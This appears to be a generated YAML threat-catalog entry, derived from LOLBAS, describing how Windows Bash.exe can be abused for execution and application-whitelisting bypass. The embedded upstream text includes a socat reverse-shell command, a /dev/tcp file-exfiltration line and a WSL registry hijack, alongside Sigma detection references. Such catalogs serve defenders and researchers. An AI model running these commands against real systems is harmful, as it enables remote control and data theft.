@@ -1,0 +1,119 @@
+id: lolbas/T1NCaW5hcmllcy9CYXNoLnltbA/QVdMIEJ5cGFzcw/3
+type: binary
+platform: windows
+name: Bash.exe
+phases:
+- defense-evasion
+- execution
+capabilities:
+- defense-evasion
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1202
+opsec:
+  noise: medium
+  triggers: Child process from bash.exe
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml
+commands:
+- template: bash.exe -c "{CMD}"
+  comment: Executes executable from bash.exe
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Bash/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Bash.exe
+      category: AWL Bypass
+      privileges: User
+      mitre_id: T1202
+      source_file: OSBinaries/Bash.yml
+      command_source_index: 3
+      document_utf8: "---\nName: Bash.exe\nDescription: File used by Windows subsystem for Linux\nAuthor:\
+        \ Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: bash.exe -c \"{CMD}\"\n    Description:\
+        \ Executes executable from bash.exe\n    Usecase: Performs execution of specified file, can be\
+        \ used as a defensive evasion.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n\
+        \    OperatingSystem: Windows 10\n    Tags:\n      - Execute: CMD\n  - Command: bash.exe -c \"\
+        socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane\"\n    Description: Executes\
+        \ a reverse shell\n    Usecase: Performs execution of specified file, can be used as a defensive\
+        \ evasion.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n    OperatingSystem:\
+        \ Windows 10\n    Tags:\n      - Execute: CMD\n  - Command: bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'\n\
+        \    Description: Exfiltrate data\n    Usecase: Performs execution of specified file, can be used\
+        \ as a defensive evasion.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n \
+        \   OperatingSystem: Windows 10\n    Tags:\n      - Execute: CMD\n  - Command: bash.exe -c \"\
+        {CMD}\"\n    Description: Executes executable from bash.exe\n    Usecase: Performs execution of\
+        \ specified file, can be used to bypass Application Whitelisting.\n    Category: AWL Bypass\n\
+        \    Privileges: User\n    MitreID: T1202\n    OperatingSystem: Windows 10\n    Tags:\n      -\
+        \ Execute: CMD\n  - Command: bash.exe\n    Description: When executed, `bash.exe` queries the\
+        \ registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`,\
+        \ which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another\
+        \ folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe`\
+        \ in the program files folder.\n    Usecase: Execute a payload as a child process of `bash.exe`\
+        \ while masquerading as WSL.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n\
+        \    OperatingSystem: Windows 10, Windows Server 2019, Windows 11\n    Tags:\n      - Execute:\
+        \ CMD\nFull_Path:\n  - Path: C:\\Windows\\System32\\bash.exe\n  - Path: C:\\Windows\\SysWOW64\\\
+        bash.exe\nDetection:\n  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_bash.yml\n\
+        \  - IOC: Child process from bash.exe\nResources:\n  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        \  - Link: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/\n\
+        Acknowledgement:\n  - Person: Alex Ionescu\n    Handle: '@aionescu'\n  - Person: Asif Matadar\n\
+        \    Handle: '@d1r4c'\n  - Person: Liran Ravich, CardinalOps\n"
+      document_sha256: sha256:58ad0c1e61654fe977a2b30599e10eb88a54ccaed1f3d468bf634a1679ed499c
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Bash/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: defense-evasion
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1202
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:535a8f06ae4af8c16dd063b017c68302c31c0bf78f4f7151c562f90af457b7fe
